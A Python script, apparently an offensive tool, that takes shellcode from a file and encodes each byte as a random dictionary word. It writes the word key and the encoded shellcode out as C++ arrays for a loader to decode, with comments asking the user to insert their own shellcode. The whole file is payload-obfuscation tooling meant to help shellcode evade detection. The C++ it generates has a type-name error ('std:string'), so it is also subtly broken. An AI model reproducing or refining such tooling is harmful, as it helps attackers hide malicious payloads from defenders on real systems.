# Takes ~ 30sec to execute
# You need to add your shellcode
# Output is Key + encrypted_shellcode in C++


# pip3 install random-word

from random_word import RandomWords
import sys
import re

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <input_file>")
    sys.exit(1)

input_file_name = sys.argv[1]

def get_shellcode_from_file(input_file_name):
    # Shellcode placeholder
    shellcode = ""
    # Shellcode line regex
    regex = re.compile("^\s*\"(.*)\";?$")
    # Opening the file
    with open(input_file_name, "r") as input:
        lines = input.readlines()
        # Iterating through the lines
        for line in lines:
            # If a line starts with a double quote (with optionnal spaces or tabs before), it is the beginning of a part of the shellcode
            if regex.match(line):
                # We add the shellcode part to the shellcode string
                shellcode += regex.match(line).group(1)
    return shellcode


rw= RandomWords()

table = []
while len(table) < 256:
    word = rw.get_random_word()
    if word not in table:
        table.append(word)

#Print the key, it is a list of 256 random words from dictionnary
#First word correspond to 0X00, 256th word correspond to 0xff
#C++ output because decoding takes place in C++
#We need key + encoded shellcode to decode in c++

content = ""
content += "std:string key[256] = {"
for word in table:
    content += f"\"{word}\","
content+= "};"


def encrypt(hex_list, key):
    encrypted = []
    for hex_value in hex_list:
        index = int(hex_value, 16)
        encrypted.append(key[index])
    return encrypted

#Put your shellcode here
#Be careful, you can keep the several "" but it MUST be in ONE LINE, remove semi colon
# https://lingojam.com/TexttoOneLine
shellcode = get_shellcode_from_file(input_file_name)

shellcode = shellcode.replace('"', '')


hex_list = [hex(ord(c)) for c in shellcode]

encrypted = encrypt(hex_list,table)

content += "\n\nstd:string encrypted["+str(len(encrypted))+"] = {"
for word in encrypted:
    content+= f"\"{word}\","
content += "};"

file = open("output", "w")
file.write(content)
file.close()